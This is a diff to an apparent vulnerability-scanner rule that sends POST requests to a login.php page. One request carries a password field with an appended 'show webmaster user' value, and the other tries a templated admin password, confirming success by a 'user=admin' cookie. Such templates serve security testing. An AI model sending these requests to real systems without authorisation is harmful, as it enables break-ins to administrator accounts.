@@ -10,8 +10,6 @@ rules:
         request:
             method: POST
             path: /login.php
-            headers:
-                Content-Type: application/x-www-form-urlencoded
             body: |
                 username=admin&password=admin?show+webmaster+user
         expression: response.status == 200 && response.content_type.contains("text/json")
@@ -22,10 +20,8 @@ rules:
         request:
             method: POST
             path: /login.php
-            headers:
-                Content-Type: application/x-www-form-urlencoded
             body: |
                 username=admin&password={{password}}
-        expression: response.status == 200 && response.content_type.contains("text/json") && response.headers["Set-Cookie"].contains("user=admin") && response.body.bcontains(b"{\"data\":\"0\",\"status\":1}")
+        expression: response.status == 200 && response.content_type.contains("text/json") && response.raw_header.bcontains(b"user=admin") && response.raw_header.bcontains(b"Set-Cookie:") && response.body.bcontains(b"{\"data\":\"0\",\"status\":1}")
 expression: r0() && r1()
 
